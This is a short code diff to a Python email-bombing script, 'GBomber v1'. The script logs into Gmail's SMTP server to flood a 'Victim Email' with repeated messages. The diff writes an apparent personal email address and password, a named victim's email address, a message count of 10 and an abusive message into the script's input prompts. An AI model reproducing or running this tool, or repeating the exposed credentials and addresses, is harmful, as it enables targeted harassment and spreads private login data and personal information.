@@ -8,12 +8,12 @@ from time import sleep
 print('GBomber v1 - by Jumpy22')
 print('\n\n')
 
-user = input('Username: ')
-email = input('\Your Email: ')
-password = getpass('\Your Password: ')
-vicEmail = input('\nVictim Email: ')
-total = input('\nEmail #: ')
-msg = input('\nMessage: ')
+user = input('Dirk: ')
+email = input('\dirkhermans@hotmail.com: ')
+password = getpass('\Jaar@1976: ')
+vicEmail = input('\nphilipvanbeirs@hotmail.com: ')
+total = input('\n10 #: ')
+msg = input('\nFckoff: ')
 
 try:
     server = smtplib.SMTP("smtp.gmail.com", 587)
